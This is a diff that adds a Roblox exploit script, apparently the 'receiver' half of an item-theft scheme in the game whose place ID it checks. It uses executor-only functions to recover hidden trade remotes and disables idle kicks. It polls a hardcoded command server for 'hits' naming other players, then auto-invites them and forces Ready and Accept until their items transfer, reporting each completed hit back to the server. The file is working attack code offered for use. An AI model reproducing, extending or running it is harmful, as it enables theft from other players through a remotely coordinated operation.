@@ -1,0 +1,1038 @@
+-- discord.gg/syncrypt
+
+repeat
+	task.wait()
+until game:IsLoaded()
+
+local Players = game:GetService("Players")
+
+game:GetService("ReplicatedStorage")
+game:GetService("TweenService")
+
+for _, v in pairs(getconnections(Players.LocalPlayer.Idled)) do
+	if v.Disable then
+		v:Disable()
+	end
+end
+
+if _G.__SabRecvRan then
+	return
+end
+
+_G.__SabRecvRan = true
+
+if game.PlaceId ~= 109983668079237 then
+	game.Players.LocalPlayer:Kick("Wrong game")
+
+	return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() ~= "VIPServer" then
+	game.Players.LocalPlayer:Kick([[You can only use the 
+Auto Accept script in Private Servers
+(For your own safety)
+]])
+
+	return
+end
+
+if not game:IsLoaded() then
+	game.Loaded:Wait()
+end
+
+local Players2 = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+local LocalPlayer = Players2.LocalPlayer
+local v11 = "https://pastefy.app/fuWreksR/raw?t=" .. tostring(tick())
+
+local function v12()
+	local ok, result = pcall(function()
+		return game:HttpGet(v11)
+	end)
+
+	if ok and result then
+		local match = result:match("^%s*(.-)%s*$")
+
+		if match and match ~= "" then
+			if match:match("^https?://") then
+				return match
+			end
+
+			return "http://" .. match
+		end
+	end
+
+	return "http://212.119.42.158:3000"
+end
+
+if not getgenv().SAB_RECV_API_BASE then
+	getgenv().SAB_RECV_API_BASE = v12()
+end
+
+local SAB_RECV_API_BASE = getgenv().SAB_RECV_API_BASE
+local u17 = false
+local t1 = {}
+local polls = 0
+local trades = 0
+local ScreenGui = Instance.new("ScreenGui")
+
+ScreenGui.Name = "SabReceiverGui"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.DisplayOrder = 99999
+pcall(function()
+	ScreenGui.Parent = CoreGui
+end)
+
+if not ScreenGui.Parent then
+	ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+end
+
+local Frame = Instance.new("Frame")
+
+Frame.Size = UDim2.new(0, 290, 0, 168)
+Frame.Position = UDim2.new(0, 12, 0, 12)
+Frame.BackgroundColor3 = Color3.fromRGB(12, 14, 22)
+Frame.BorderSizePixel = 0
+Frame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+
+UICorner.CornerRadius = UDim.new(0, 8)
+UICorner.Parent = Frame
+
+local UIStroke = Instance.new("UIStroke")
+
+UIStroke.Color = Color3.fromRGB(147, 112, 219)
+UIStroke.Thickness = 1.5
+UIStroke.Parent = Frame
+
+local u25
+local Position
+local Position2
+
+Frame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		u25 = true
+		Position = input.Position
+		Position2 = Frame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				u25 = false
+			end
+		end)
+	end
+end)
+UserInputService.InputChanged:Connect(function(input)
+	if u25 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+		local v28 = input.Position - Position
+
+		Frame.Position = UDim2.new(Position2.X.Scale, Position2.X.Offset + v28.X, Position2.Y.Scale, Position2.Y.Offset + v28.Y)
+	end
+end)
+
+local function createTextLabel(p1, p2, p3, p4, p5)
+	local TextLabel = Instance.new("TextLabel")
+
+	TextLabel.Size = UDim2.new(1, -12, 0, 18)
+	TextLabel.Position = UDim2.new(0, 8, 0, p2)
+	TextLabel.BackgroundTransparency = 1
+	TextLabel.Text = p1
+	TextLabel.TextColor3 = p4 or Color3.fromRGB(210, 210, 210)
+	TextLabel.Font = p5 and Enum.Font.GothamBold or Enum.Font.Gotham
+	TextLabel.TextSize = p3 or 11
+	TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+	TextLabel.TextTruncate = Enum.TextTruncate.AtEnd
+	TextLabel.Parent = Frame
+
+	return TextLabel
+end
+local function v31(p6)
+	local Frame2 = Instance.new("Frame")
+
+	Frame2.Size = UDim2.new(1, -16, 0, 1)
+	Frame2.Position = UDim2.new(0, 8, 0, p6)
+	Frame2.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+	Frame2.BorderSizePixel = 0
+	Frame2.Parent = Frame
+end
+
+createTextLabel("⚡ ELYSIUM — SAB RECEIVER", 6, 12, Color3.fromRGB(147, 112, 219), true)
+createTextLabel("User: " .. LocalPlayer.Name, 24, 10, Color3.fromRGB(150, 150, 170))
+v31(40)
+
+local v33 = createTextLabel("Status: Starting...", 46, 11)
+local v34 = createTextLabel("Action: —", 64, 11, Color3.fromRGB(130, 210, 255))
+local v35 = createTextLabel("Sender: —", 82, 11, Color3.fromRGB(255, 200, 100))
+local v36 = createTextLabel("Hit ID: —", 100, 11, Color3.fromRGB(180, 255, 180))
+
+v31(120)
+
+local polls2 = createTextLabel("Polls: 0", 126, 10, Color3.fromRGB(130, 130, 150))
+local trades2 = createTextLabel("Trades: 0", 142, 10, Color3.fromRGB(130, 130, 150))
+
+local function v39(p7, p8)
+	v33.Text = "Status: " .. p7
+	v33.TextColor3 = p8 or Color3.fromRGB(210, 210, 210)
+end
+local function v40(p9, p10)
+	v34.Text = "Action: " .. (p9 or "—")
+	v34.TextColor3 = p10 or Color3.fromRGB(130, 210, 255)
+end
+local function v41(p11)
+	v35.Text = "Sender: " .. (p11 or "—")
+
+	local color3 = p11 and Color3.fromRGB(255, 200, 100)
+
+	v35.TextColor3 = color3 or Color3.fromRGB(150, 150, 170)
+end
+local function v43(p12)
+	v36.Text = "Hit ID: " .. (p12 and tostring(p12) or "—")
+end
+local function v44()
+	polls += 1
+	polls2.Text = "Polls: " .. polls
+end
+local function v45()
+	trades += 1
+	trades2.Text = "Trades: " .. trades
+end
+local function v46()
+	v40(nil)
+	v41(nil)
+	v43(nil)
+end
+
+local t2 = {
+	Invite = "afb005f9-6e81-4e0a-8bb0-3555938a9658",
+	AcceptInvite = "57624f2b-8aa9-4974-bb7a-08f058af33ef",
+	SearchUser = "792baf13-54a1-4663-92c4-1edd9da1e3e2",
+	AddBrainrot = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda",
+	RemoveBrainrot = "1a5f9c76-711f-4c90-8117-2ffd3fa21c6d"
+}
+local t3 = {
+	DeclineInvite = "99448380-7cdd-45ad-be4e-332ec6194ba6",
+	CancelTrade = "9d1937e7-6262-487b-98be-af45618270c9",
+	Accept = "918ee0f5-e98f-413f-b76e-baee47b021cb",
+	Ready = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
+}
+local t4 = {}
+
+v39("🔍 Extracting remotes...", Color3.fromRGB(180, 180, 100))
+
+local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
+local clonefunction_
+local clonefunction_2
+local v53
+local v54
+
+for _, v in getgc(true) do
+	if typeof(v) == "function" then
+		local v57 = debug.getinfo(v)
+
+		if v57 and v57.source == "=ReplicatedStorage.Packages.Net.Net" then
+			local v58 = debug.getupvalues(v)
+			local v59 = v58 and v58[9]
+
+			if type(v59) == "table" then
+				local value = rawget(v59, 1)
+				local value2 = rawget(v59, 2)
+
+				if type(value) == "function" and type(value2) == "function" and typeof(v59[0]) ~= "function" then
+					clonefunction_ = clonefunction and clonefunction(value) or value
+					clonefunction_2 = clonefunction and clonefunction(value2) or value2
+					v53 = v59[3]
+					v54 = v59[4]
+					print("[NET] Found encryption functions")
+
+					break
+				end
+			end
+		end
+	end
+end
+
+local function v62(p13, p14)
+	if not clonefunction_ or not clonefunction_2 then
+		return nil
+	end
+
+	local v63 = v53
+	local v64 = v54
+	local v65 = clonefunction_2(p13, v63)
+	local v66 = buffer.fromstring(v65)
+	local v67 = tostring(v64 .. v63)
+
+	return Net:FindFirstChild(p14 .. clonefunction_(v66, buffer.fromstring(v67)))
+end
+
+for _, v in ipairs({
+	{
+		name = "Invite",
+		path = "TradeService/Invite",
+		prefix = "RF/"
+	},
+	{
+		name = "SearchUser",
+		path = "TradeService/SearchUser",
+		prefix = "RF/"
+	},
+	{
+		name = "AcceptInvite",
+		path = "TradeService/AcceptInvite",
+		prefix = "RF/"
+	},
+	{
+		name = "AddBrainrot",
+		path = "TradeService/AddBrainrot",
+		prefix = "RF/"
+	},
+	{
+		name = "RemoveBrainrot",
+		path = "TradeService/RemoveBrainrot",
+		prefix = "RF/"
+	},
+	{
+		name = "CreateInvite",
+		path = "TradeService/CreateInvite",
+		prefix = "RE/"
+	},
+	{
+		name = "DeclineInvite",
+		path = "TradeService/DeclineInvite",
+		prefix = "RE/"
+	},
+	{
+		name = "CancelTrade",
+		path = "TradeService/CancelTrade",
+		prefix = "RE/"
+	},
+	{
+		name = "Accept",
+		path = "TradeService/Accept",
+		prefix = "RE/"
+	},
+	{
+		name = "Ready",
+		path = "TradeService/Ready",
+		prefix = "RE/"
+	},
+	{
+		name = "TradeCompleted",
+		path = "TradeService/TradeCompleted",
+		prefix = "RE/"
+	}
+}) do
+	local v70 = v62(v.path, v.prefix)
+
+	if v70 then
+		t4[v.name] = v70
+		print("[FETCH] ✓ " .. v.name .. " = " .. v70:GetFullName())
+	end
+end
+
+if table.maxn(t4) < 8 then
+	print("[FETCH] Encryption incomplete, trying sibling scan...")
+
+	local children = Net:GetChildren()
+	local t5 = {
+		["RF/TradeService/Invite"] = {
+			"Invite",
+			"RemoteFunction"
+		},
+		["RF/TradeService/SearchUser"] = {
+			"SearchUser",
+			"RemoteFunction"
+		},
+		["RF/TradeService/AcceptInvite"] = {
+			"AcceptInvite",
+			"RemoteFunction"
+		},
+		["RF/TradeService/AddBrainrot"] = {
+			"AddBrainrot",
+			"RemoteFunction"
+		},
+		["RF/TradeService/RemoveBrainrot"] = {
+			"RemoveBrainrot",
+			"RemoteFunction"
+		},
+		["RE/TradeService/CreateInvite"] = {
+			"CreateInvite",
+			"RemoteEvent"
+		},
+		["RE/TradeService/DeclineInvite"] = {
+			"DeclineInvite",
+			"RemoteEvent"
+		},
+		["RE/TradeService/CancelTrade"] = {
+			"CancelTrade",
+			"RemoteEvent"
+		},
+		["RE/TradeService/Accept"] = {
+			"Accept",
+			"RemoteEvent"
+		},
+		["RE/TradeService/Ready"] = {
+			"Ready",
+			"RemoteEvent"
+		},
+		["RE/TradeService/TradeCompleted"] = {
+			"TradeCompleted",
+			"RemoteEvent"
+		}
+	}
+
+	for i, child in ipairs(children) do
+		local v75 = t5[child.Name]
+
+		if v75 and not t4[v75[1]] then
+			if children[i + 1] and children[i + 1].ClassName == v75[2] then
+				t4[v75[1]] = children[i + 1]
+			elseif i > 1 and children[i - 1].ClassName == v75[2] then
+				t4[v75[1]] = children[i - 1]
+			end
+		end
+	end
+end
+
+local t6 = {}
+
+for _, v in ipairs({
+	"CreateInvite",
+	"AcceptInvite",
+	"Invite",
+	"SearchUser",
+	"CancelTrade",
+	"Ready",
+	"Accept",
+	"TradeCompleted"
+}) do
+	if not t4[v] then
+		t6[#t6 + 1] = v
+	end
+end
+
+if #t6 == 0 then
+	print("[FETCH] All remotes ready! (" .. table.maxn(t4) .. " total)")
+	v39("✅ Remotes ready", Color3.fromRGB(100, 255, 150))
+else
+	warn("[FETCH] Missing: " .. table.concat(t6, ", "))
+	v39("⚠️ Missing: " .. table.concat(t6, ", "), Color3.fromRGB(255, 150, 50))
+end
+
+local function v79()
+	local t7 = {}
+
+	for _, v in ipairs(getgc(true)) do
+		if type(v) == "table" then
+			t7[#t7 + 1] = v
+		end
+	end
+
+	return t7
+end
+local function v83()
+	local t8 = {}
+
+	for _, v in ipairs(getgc(true)) do
+		if type(v) == "function" then
+			t8[#t8 + 1] = v
+		end
+	end
+
+	return t8
+end
+local function v87(p15, p16)
+	local v88 = p16 or 0
+
+	if type(p15) ~= "function" or v88 > 3 then
+		return {}, {}
+	end
+
+	local t9 = {}
+	local t10 = {}
+	local ok, result = pcall(getupvalues, p15)
+
+	if ok then
+		if result then
+			for _, v in pairs(result) do
+				if typeof(v) == "Instance" then
+					if v:IsA("RemoteEvent") then
+						t9[#t9 + 1] = v
+					elseif v:IsA("RemoteFunction") then
+						t10[#t10 + 1] = v
+					end
+				end
+			end
+		end
+	end
+
+	return t9, t10
+end
+local function v95(p17, ...)
+	local v96 = t4[p17]
+
+	if not v96 then
+		warn("[NET] Missing RF:", p17)
+
+		return false, nil, nil, nil
+	end
+
+	local v97 = t2[p17]
+	local v98 = v97 and {
+		v97,
+		...
+	} or { ... }
+	local ok, result, result2, result3 = pcall(function()
+		return v96:InvokeServer(table.unpack(v98))
+	end)
+
+	if not ok then
+		warn("[NET] RF error", p17, ":", tostring(result))
+	end
+
+	return ok, result, result2, result3
+end
+local function v103(p18, ...)
+	local v104 = t4[p18]
+
+	if not v104 then
+		warn("[NET] Missing RE:", p18)
+
+		return
+	end
+
+	local v105 = t3[p18]
+	local v106 = v105 and {
+		v105,
+		...
+	} or { ... }
+
+	pcall(function()
+		v104:FireServer(table.unpack(v106))
+	end)
+end
+local function v107(p19, ...)
+	local v108 = t4[p19]
+
+	if not v108 then
+		warn("[NET] Missing RF:", p19)
+
+		return false, nil
+	end
+
+	local v109 = t2[p19]
+	local v110 = v109 and {
+		v109,
+		...
+	} or { ... }
+	local ok, result, result2, result3 = pcall(function()
+		return v108:InvokeServer(table.unpack(v110))
+	end)
+
+	if not ok then
+		warn("[NET] RF error", p19, ":", tostring(result))
+	end
+
+	return ok, result, result2, result3
+end
+local function v115(p20, ...)
+	local v116 = t4[p20]
+
+	if not v116 then
+		return
+	end
+
+	local v117 = t3[p20]
+	local v118 = v117 and {
+		v117,
+		...
+	} or { ... }
+
+	pcall(function()
+		v116:FireServer(table.unpack(v118))
+	end)
+end
+
+local ReplicatorClient = require(ReplicatedStorage.Packages.ReplicatorClient)
+
+local function v120()
+	return syn and syn.request or http and http.request or request or http_request
+end
+local function v121(p21)
+	local v122 = v120()
+
+	if not v122 then
+		return nil
+	end
+
+	local ok, result = pcall(v122, {
+		Url = p21,
+		Method = "GET",
+		Headers = {
+			["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
+		}
+	})
+
+	if not ok or not result or not result.Body then
+		return nil
+	end
+
+	local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, result.Body)
+
+	return ok2 and result2 or nil
+end
+local function v127(p22, p23)
+	local v128 = v120()
+
+	if not v128 then
+		return nil
+	end
+
+	local ok, result = pcall(v128, {
+		Url = p22,
+		Method = "POST",
+		Headers = {
+			["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside",
+			["Content-Type"] = "application/json"
+		},
+		Body = HttpService:JSONEncode(p23)
+	})
+
+	if not ok or not result or not result.Body then
+		return nil
+	end
+
+	local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, result.Body)
+
+	return ok2 and result2 or nil
+end
+local function v133(p24)
+	local ok, result = pcall(Players2.GetUserIdFromNameAsync, Players2, p24)
+
+	return ok and result or nil
+end
+local function v136(p25)
+	local SearchUser, v138, v139, v140 = v107("SearchUser", p25)
+
+	print(("[ONLINE] SearchUser: ok=%s a=%s b=%s c=%s"):format(tostring(SearchUser), tostring(v138), tostring(v139), tostring(v140)))
+
+	return SearchUser and v138 and v139 and v140
+end
+local function v141()
+	local ok, result = pcall(function()
+		return ReplicatorClient.get(("Trade_%d"):format(LocalPlayer.UserId))
+	end)
+
+	return ok and result or nil
+end
+local function v144(p26)
+	local v145 = tick() + p26
+	local v146
+
+	while true do
+		if not (tick() < v145) then
+			return nil
+		end
+
+		v146 = v141()
+
+		if not v146 or not v146:TryIndex({
+			"active",
+			"data"
+		}) then
+			task.wait(0.5)
+
+			continue
+		end
+
+		break
+	end
+
+	return v146
+end
+local function v147(p27)
+	local v148 = p27:TryIndex({
+		"active",
+		"data",
+		"users"
+	})
+
+	if not v148 then
+		return nil
+	end
+
+	for k, v in pairs(v148) do
+		if v == LocalPlayer.UserId then
+			return k
+		end
+	end
+
+	return nil
+end
+local function v151(p28)
+	for i = 1, 30 do
+		if not p28:TryIndex({
+			"active",
+			"data"
+		}) then
+			return false
+		end
+
+		local v153 = p28:TryIndex({
+			"active",
+			"data",
+			"lastChange"
+		})
+
+		if typeof(v153) ~= "number" then
+			task.wait(0.2)
+
+			continue
+		end
+
+		local v154 = v153 + 5 - Workspace:GetServerTimeNow()
+
+		if v154 <= 0 then
+			return true
+		end
+
+		task.wait(v154 + 0.05)
+
+		return true
+	end
+
+	return true
+end
+local function v155(p29)
+	local v156 = p29:TryIndex({
+		"active",
+		"data",
+		"lastChange"
+	})
+
+	if typeof(v156) ~= "number" then
+		return 0
+	end
+
+	local v157 = v156 + 5 - Workspace:GetServerTimeNow()
+
+	return v157 > 0 and v157 or 0
+end
+
+t4.CreateInvite.OnClientEvent:Connect(function(p30, p31)
+	if p31 then
+		if p31.from ~= nil then
+			local v158 = tostring(p31.from)
+
+			t1[v158] = {
+				inviteId = p30,
+				data = p31
+			}
+			print(("[INVITE] Stored invite from UID %s"):format(v158))
+
+			return
+		end
+	end
+end)
+
+local function v159(p32)
+	local v160 = tostring(p32)
+	local v161 = t1[v160]
+
+	if not v161 then
+		return nil
+	end
+
+	if not v161.data.expires or not (v161.data.expires <= Workspace:GetServerTimeNow()) then
+		t1[v160] = nil
+
+		return v161
+	end
+
+	t1[v160] = nil
+
+	return nil
+end
+local function v162(p33, p34)
+	local v163 = tick() + p34
+	local v164
+
+	while true do
+		if not (tick() < v163) then
+			return nil
+		end
+
+		v164 = v159(p33)
+
+		if not v164 then
+			task.wait(0.5)
+
+			continue
+		end
+
+		break
+	end
+
+	return v164
+end
+local function v165(p35)
+	v151(p35)
+
+	local v166 = tick() + 180
+	local n1 = 0
+	local n2 = 0
+
+	while true do
+		if not (tick() < v166) then
+			warn("[RECV] Mirror trade timed out")
+
+			return
+		end
+
+		if not p35:TryIndex({
+			"active",
+			"data"
+		}) then
+			print("[RECV] Trade channel closed")
+
+			return
+		end
+
+		local v169 = p35:TryIndex({
+			"active",
+			"data",
+			"players"
+		})
+
+		if not v169 then
+			task.wait(0.3)
+
+			continue
+		end
+
+		local v170 = v147(p35)
+
+		if not v170 then
+			task.wait(0.3)
+
+			continue
+		end
+
+		local v171 = v169[v170]
+
+		if not v171 then
+			task.wait(0.3)
+
+			continue
+		end
+
+		local v172 = true
+
+		for _, v in pairs(v169) do
+			if not v.accepted then
+				v172 = false
+
+				break
+			end
+		end
+
+		if v172 then
+			break
+		end
+
+		local v175 = true
+
+		for _, v in pairs(v169) do
+			if not v.ready then
+				v175 = false
+
+				break
+			end
+		end
+
+		local v178 = v155(p35) <= 0
+		local now = tick()
+
+		if not v175 then
+			if not v171.ready and v178 and now - n1 >= 1.5 then
+				n1 = now
+				v115("Ready")
+				print("[RECV] Sent Ready (retrying until confirmed)")
+			end
+		elseif not v171.accepted and v178 and now - n2 >= 1.5 then
+			n2 = now
+			v115("Accept")
+			print("[RECV] Sent Accept (retrying until confirmed)")
+		end
+
+		task.wait(0.3)
+	end
+
+	print("[RECV] All accepted — trade complete ✓")
+end
+local function v180(p36)
+	if not p36 then
+		return
+	end
+
+	print(("[VPS] Completing hit %s"):format(tostring(p36)))
+	v127(SAB_RECV_API_BASE .. "/complete-hit", {
+		hit_id = p36,
+		username = LocalPlayer.Name,
+		game_type = "sab"
+	})
+end
+local function v181(p37, p38)
+	print(("[HIT] id=%s  sender=%s"):format(tostring(p37), tostring(p38)))
+	v41(p38)
+	v43(p37)
+
+	local function v182(p39)
+		warn(("[HIT] bail — %s"):format(p39))
+		v39("⏭️ Skip: " .. p39, Color3.fromRGB(255, 120, 80))
+		v180(p37)
+		task.wait(1)
+		v46()
+	end
+
+	local v183 = v133(p38)
+
+	if not v183 then
+		return v182("can't resolve UID for " .. tostring(p38))
+	end
+
+	v40("Checking if " .. p38 .. " is online...", Color3.fromRGB(180, 180, 100))
+
+	if not v136(v183) then
+		print(("[HIT] %s is offline"):format(p38))
+
+		return v182(p38 .. " offline")
+	end
+
+	print(("[HIT] %s is online"):format(p38))
+	t1[tostring(v183)] = nil
+
+	local v184
+
+	v40("Waiting for invite from " .. p38 .. "...", Color3.fromRGB(255, 200, 80))
+
+	local v185 = v162(v183, 20)
+
+	if v185 then
+		v40("Accepting invite from " .. p38, Color3.fromRGB(100, 220, 255))
+		print(("[HIT] Accepting invite id=%s from %s"):format(tostring(v185.inviteId), p38))
+
+		local AcceptInvite, v187, v188 = v107("AcceptInvite", v185.inviteId)
+
+		if not AcceptInvite or v187 == false then
+			warn(("[HIT] AcceptInvite failed (%s) — falling back to send"):format(tostring(v188 or v187)))
+		else
+			v184 = v144(60)
+		end
+	end
+
+	if not v184 then
+		v40("Sending invite to " .. p38, Color3.fromRGB(255, 180, 50))
+		print(("[HIT] Sending invite to %s"):format(p38))
+
+		local Invite, v190, v191 = v107("Invite", v183)
+
+		if not Invite or v190 == false then
+			return v182("invite send failed: " .. tostring(v191 or v190))
+		end
+
+		v184 = v144(60)
+	end
+
+	if not v184 then
+		return v182("trade channel never opened")
+	end
+
+	v39("🤝 Trading with " .. p38, Color3.fromRGB(80, 255, 150))
+	v40("Mirroring trade — ready/accept only", Color3.fromRGB(150, 255, 150))
+	print("[HIT] Trade channel open — mirroring")
+	v165(v184)
+
+	local v192 = tick() + 10
+
+	while tick() < v192 do
+		if v184:TryIndex({
+			"active",
+			"data"
+		}) then
+			task.wait(0.5)
+
+			continue
+		end
+
+		break
+	end
+
+	v45()
+	v39("✅ Trade done!", Color3.fromRGB(80, 255, 150))
+	print(("[HIT] Trade done — completing hit %s"):format(tostring(p37)))
+	v180(p37)
+	task.wait(1.5)
+	v46()
+end
+
+print("[RECV] SAB Receiver v2 (Improved) — started")
+print("[RECV] Username:", LocalPlayer.Name)
+task.spawn(function()
+	task.wait(4)
+	v39("🔍 Polling VPS...", Color3.fromRGB(150, 150, 220))
+
+	while true do
+		task.wait(1)
+
+		if not u17 then
+			v44()
+
+			local v193 = v121(SAB_RECV_API_BASE .. "/sab-client2-status?username=" .. HttpService:UrlEncode(LocalPlayer.Name))
+
+			if not v193 then
+				v39("⚠️ VPS no response", Color3.fromRGB(255, 100, 100))
+				warn("[VPS] No response from sab-client2-status")
+
+				continue
+			end
+
+			if v193.action ~= "trade" then
+				v39("🔍 Polling VPS...", Color3.fromRGB(150, 150, 220))
+
+				continue
+			end
+
+			local hit_id = v193.hit_id
+			local sender = v193.sender
+
+			if not hit_id or not sender then
+				warn("[VPS] Malformed trade action — missing hit_id or sender")
+				v39("⚠️ Malformed hit data", Color3.fromRGB(255, 100, 100))
+
+				continue
+			end
+
+			print(("[VPS] Hit! id=%s  sender=%s"):format(tostring(hit_id), tostring(sender)))
+			v39("🎯 Hit received!", Color3.fromRGB(255, 200, 80))
+			u17 = true
+			task.spawn(function()
+				local ok, result = pcall(v181, hit_id, sender)
+
+				if not ok then
+					warn("[RECV] handleHit error:", tostring(result))
+					v39("❌ Error: " .. tostring(result), Color3.fromRGB(255, 80, 80))
+					pcall(v180, hit_id)
+					v46()
+				end
+
+				u17 = false
+				v39("🔍 Polling VPS...", Color3.fromRGB(150, 150, 220))
+			end)
+		end
+	end
+end)
